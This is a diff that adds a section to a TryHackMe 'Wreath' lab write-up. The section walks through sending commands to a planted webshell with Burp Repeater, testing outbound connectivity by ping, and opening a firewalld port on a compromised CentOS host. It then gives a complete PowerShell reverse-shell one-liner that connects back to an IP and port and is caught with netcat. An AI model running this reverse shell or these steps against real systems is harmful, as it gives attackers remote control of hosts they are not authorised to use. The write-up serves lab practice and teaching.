@@ -1096,29 +1096,77 @@
 
    ![alt_text](https://github.com/kashyap-source/Try-Hack-Me/blob/master/Wreath/Image/Screenshot_1.png)
 
+   ![alt_text](https://github.com/kashyap-source/Try-Hack-Me/blob/master/Wreath/Image/Screenshot_2.png)
 
+   We then press Ctrl + R to send the request to Repeater on the top menu.
 
+   Next we change the "GET" on line 1 to "POST". We then add a Content-Type header on line 9 to tell the server to accept POST paramters:
+   Content-Type: application/x-www-form-urlencoded
+  
+   ![image](https://user-images.githubusercontent.com/68686150/115829406-97f71200-a42c-11eb-82ba-04775df77694.png)
 
+   Finally, on line 11 we add a=COMMAND:
+  
+   Press send, and see the response come in!
 
+   ![alt_text](https://github.com/kashyap-source/Try-Hack-Me/blob/master/Wreath/Image/Screenshot_3.png)
 
+   ![image](https://user-images.githubusercontent.com/68686150/115829782-00de8a00-a42d-11eb-9e0b-37e742afdf38.png) 
 
+   Before we go for a reverse shell, we need to establish whether or not this target is allowed to connect to the outside world. The typical way of doing this is by executing      the ping command on the compromised server to ping our own IP and using a network interceptor (Wireshark, TCPDump, etc) to see if the ICMP echo requests make it through. If    they do then network connectivity is established, otherwise we may need to go back to the drawing board.
 
+   To start up a TCPDump listener we would use the following command:
 
+     tcpdump -i tun0 icmp
 
+   Note: if your VPN is not using the tun0 interface then you will need to replace this with the correct interface for your system which can be found using ip -a link to see      the available interfaces.
 
+   Now, using the webshell, execute the following ping command (substituting in your own VPN IP!):
 
+     ping -n 3 ATTACKING_IP
 
+   This will send three ICMP ping packets back to you.
 
+   ![image](https://user-images.githubusercontent.com/68686150/115829965-4307cb80-a42d-11eb-9035-3a1e6876455a.png)
 
+   Looks like we're going to need to think outside the box to catch this shell.
 
+   We have two easy options here:
 
+   Given we have a fully stable shell on .200, we could upload a static copy of netcat and just catch the shell here
+   We could set up a relay on .200 to forward a shell back to a listener
+   It is up to you which option you choose (although for the sake of practice, a socat relay is suggested); however, whichever way you choose, please be mindful of other users    at earlier stages of the network and ensure that any ports you open are above 15000.
+   Before we can do this, however, we need to take one other thing into account. CentOS uses an always-on wrapper around the IPTables firewall called "firewalld". By default,      this firewall is extremely restrictive, only allowing access to SSH and anything else the sysadmin has specified. Before we can start capturing (or relaying) shells, we will    need to open our desired port in the firewall. This can be done with the following command:
 
+     firewall-cmd --zone=public --add-port PORT/tcp
 
+   Substituting in your desired choice of port.
+  
+   ![image](https://user-images.githubusercontent.com/68686150/115831000-a5ad9700-a42e-11eb-8862-9b121882f29d.png)
 
+   ![image](https://user-images.githubusercontent.com/68686150/115830104-777b8780-a42d-11eb-8876-6c29404c8c53.png)
 
+   In this command we are using two switches. First we set the zone to public -- meaning that the rule will apply to every inbound connection to this port. We then specify        which port we want to open, along with the protocol we want to use (TCP).
 
+   With that done, set up either a listener or a relay on .200.
 
+   Let's go for a reverse shell!
 
+   We can use a Powershell reverse shell for this. Take the following shell command and substitute in the IP of the webserver, and the port you opened in the .200 firewall in      the previous question where it says IP and PORT:
+       
+       powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|% {0};while(($i =                        $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String        );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte =                                                                                                                ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+   As this is a web exploit, we now have to URL encode the shell command. If using Burpsuite, you can do this by pasting the command in as the value for the "a" parameter, then    selecting it and pressing Ctrl + U:
+
+   ![alt_text](https://github.com/kashyap-source/Try-Hack-Me/blob/master/Wreath/Image/Screenshot_4.png)
+
+   If you are using cURL then there are a variety of options available. cURL does provide a --data-urlencode switch; however, it's often easiest to just use a website to encode    the shell command, then copy it in with the -d switch:
+
+   Pick a method (cURL, BurpSuite, or any others) and get a shell!
+   
+   I have used netcat 
+   
+   ![image](https://user-images.githubusercontent.com/68686150/115831052-b6f6a380-a42e-11eb-8fd5-38295cc949c4.png)
 
 
 
